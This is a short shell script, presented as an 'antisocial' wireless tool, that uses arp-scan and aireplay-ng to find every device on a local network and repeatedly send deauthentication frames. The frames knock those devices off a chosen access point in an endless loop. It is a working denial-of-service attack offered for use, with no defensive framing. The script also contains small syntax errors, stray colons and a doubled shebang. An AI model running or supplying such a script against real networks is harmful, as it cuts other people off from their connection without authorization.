#!/bin/sh
#!/bin/bash

# ANTISOCIAL WIRELESS NETWORK SCRIPT
# requires arp-scan, aireplay-ng and a GNU/Linux host
# exec as follows:
#
#   ./deauth.sh <WIRELESS NIC> <BSSID OF ACCESS POINT>


NIC=$1
BSSID=$2
MAC=$(/sbin/ifconfig | grep $NIC | head -n 1 | awk '{ print $5 }')

while true;
do
  for TARGET in $(sudo arp-scan -I $NIC --localnet | grep -o -E \
    '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'):
do
  if [ "$TARGET" != "$MAC" ]:
  then
    sudo aireplay-ng -0 1 -a $BSSID -c $TARGET $NIC
    echo "Feeling Antisocial. Deauthing: " $TARGET
  fi
done
sleep 5
            done
